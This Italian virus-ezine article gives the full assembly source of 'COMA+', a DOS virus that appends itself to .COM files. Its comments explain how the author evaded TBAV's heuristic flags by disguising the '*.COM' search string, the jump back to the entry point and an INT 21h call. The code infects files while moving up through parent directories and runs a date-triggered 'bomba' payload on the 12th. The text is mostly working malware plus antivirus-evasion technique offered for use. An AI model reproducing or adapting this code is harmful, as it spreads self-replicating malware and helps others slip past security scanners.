; Sul numero zero di questa ezine ho pubblicato un semplice virus di            ; appending per files .COM con un fit bassissimo, ma utile per far capire       ; ai principianti le basi di questa nobile arte.                                ; COMA perï ä facilmente individuabile dagli antivirus euristici, quindi        ; ecco COMA+, che fa le stesse cose, ma elimina qualche di flag dallo scan      ; del TBAV.                                                                     ; Per chi non lo sapesse il TBAV assegna dei flag ai file che scanna, ad        ; esempio se un file contiene una procedura per ricercare dei file .EXE o       ; dei file .COM gli assegna il flag S, se contiene una routine di criptazione   ; gli assegnerÖ un altro flag, ora se questi flag superano un certo numero      ; l'antivirus ä sicuro che quello ä un virus ä lo segnala come virus            ; sconosciuto. Per rendere invisibile COMA+ al TBAV non ho dovuto eliminare     ; tutti i flag ma solo tre.                                                     ;                                                                               ; 1) S - Prima il mio virus conteneva la stringa *.COM che faceva capire        ;        al TBAV che il programma ricercava dei file COM quindi ho scritto      ;        ).com e al momento di usare la stringa aumento di 1 il valore del      ;        primo carattere, ottenendo cosç di nuovo *.COM, ma in questo modo      ;        il TBAV non mi riconosce pió il flag S                                 ;                                                                               ; 2) B - Per far eseguire al virus il vero programma, per non far nascere       ;        sospetti, avevo scritto : MOV AX,100h seguito da JMP AX. In questo     ;        modo saltava all'inizio del programma ma il bastardissimo TBAV         ;        lo riconosceva... quindi ho cambiato con MOV AX,200h - SHR AX,1        ;         - JMP AX, e cosç anche questo flag ä eliminato                        ;                                                                               ; 3) U - La 'bomba' usa l'interrupt 21h con ah=71h. Questo viene riconosciuto   ;    dal TBAV come un ulteriore indizio, quindi ho scritto prima in ah 11h,     ;    e poi ho aggiunto 60h.                                                     ;                                                                               ;                                                                               ; Se ä settato a Auto Heuristic Sensitivity o Low Heuristic Sensitivity per     ; fotterlo basta eliminare due di questi flags, se ä settato a High Heuristic   ; Sensitivity allora bisogna eliminarli tutti e tre.                            ;                                                                               ; Riconosce ancora un paio flag, ma sono troppo pochi e lo prende per un falso  ; allarme, pur visualizzando i flags dice cmq che il file ä pulito.             ; bello no ?                                                                    ;                                                                               ;                                                                               ;       Techno Knight  (techno83@freemail.it)                                                                                                                                                                                                                                                                                   codice segment 'code'                                                           org 100h                                                                        assume cs:codice,ds:codice,es:codice                                            start proc far                                                                  lunghezza equ fine-via                                                          via:                                                                            db 90h, 90h, 90h, 90h, 90h                                                      QUA:                                                                            CALL NOFINE                                                                     CALL FINE2                                                                      NOFINE:                                                                         PUSH cs                                                                         PUSH cs                                                                         POP ds                                                                          POP es                                                                          CALL niente                                                                     niente:                                                                         POP  BP                                                                         SUB  BP, OFFSET niente                                                          LEA SI,BP+iniziale                                                              MOV AH,47h                                                                      MOV DL,0                                                                        INT 21h                                                                         infetta:                                                                        MOV AH,4eh                                                                      INC byte ptr[BP+OFFSET comfile]                                                 LEA DX,BP+comfile                                                               MOV CX,0000h                                                                    INT 21h                                                                         DEC byte ptr[BP+OFFSET comfile]                                                 MOV AH,3dh                                                                      MOV AL,00000010b                                                                MOV DX,009eh                                                                    INT 21h                                                                         PUSH AX                                                                         POP BX                                                                          LEA DI,BP+iprimitretmp                                                          LEA SI,BP+iprimitre                                                             MOV CX,3                                                                        REP MOVSB                                                                       MOV AH,3fh                                                                      MOV CX,3                                                                        LEA DX,BP+iprimitre                                                             INT 21h                                                                         MOV AX,4200h                                                                    MOV CX,0                                                                        MOV DX,0                                                                        INT 21h                                                                         MOV AH,40h                                                                      MOV CX,1                                                                        LEA DX,BP+jump                                                                  INT 21h                                                                         LEA DI,BP+dimensione                                                            MOV SI,009ah                                                                    MOV CX,4                                                                        REP MOVSB                                                                       MOV AH,40h                                                                      MOV CX,2                                                                        LEA DX,BP+dimensione                                                            INT 21h                                                                         MOV AX,4202h                                                                    MOV CX,0                                                                        MOV DX,0                                                                        INT 21h                                                                         MOV AH,40h                                                                      MOV CX,lunghezza                                                                LEA DX,BP+via                                                                   INT 21h                                                                         MOV AH,3Eh                                                                      INT 21h                                                                         LEA SI,BP+iprimitretmp                                                          LEA DI,BP+iprimitre                                                             MOV CX,3                                                                        REP MOVSB                                                                       MOV AH,2Ah                                                                      INT 21H                                                                         CMP DL,12                                                                       JE  bomba                                                                       JMP nobomba                                                                     bomba:                                                                          MOV AX,11AAh                                                                    ADD AH,60h                                                                      MOV BH,0                                                                        MOV BL,1                                                                        LEA DX,BP+path1                                                                 INT 21h                                                                         nobomba:                                                                        LEA DX,BP+indietro                                                              MOV AH,3Bh                                                                      INT 21h                                                                         LEA SI,BP+vediamo                                                               MOV AH,47h                                                                      MOV DL,0                                                                        INT 21h                                                                         LEA SI,BP+vediamo                                                               LODSB                                                                           CMP AL,''                                                                       JE ORABASTA                                                                     JMP infetta                                                                     orabasta:                                                                       LEA DX,BP+iniziale                                                              MOV AH,3Bh                                                                      INT 21h                                                                         LEA SI,BP+iprimitre                                                             MOV DI,100h                                                                     MOV CX,3                                                                        REP MOVSB                                                                       LEA DI,BP+QUA                                                                   MOV AL,90h                                                                      MOV CX,3                                                                        REP STOSB                                                                       MOV AX,200h                                                                     SHR AX,1          ; Invece scrivendo MOV AX,100h direttamente il TBAV           JMP AX            ; gli assegna il flag B (back to entry point)                 FINE2:                                                                          MOV AX,4C00h                                                                    INT 21h                                                                         iniziale db 64 dup (?)                                                          vediamo db 64 dup (?)                                                           iprimitre db 3 dup (?)                                                          iprimitretmp db 3 dup(?)                                                        dimensione dw 2 dup (?)                                                         jump db 'È',0                                                                   comfile db ').COM',0   ; Scrivendo *.COM gli assegna il flag S                  messaggio db 'COMA+ - di Techno Knight'                                         indietro db '..',0                                                              path1 db 'c:\windows',0                                                         path2 db 'a:\',0                                                                fine:                                                                           start endp                                                                      codice ends                                                                     end via                                                                                                                                                         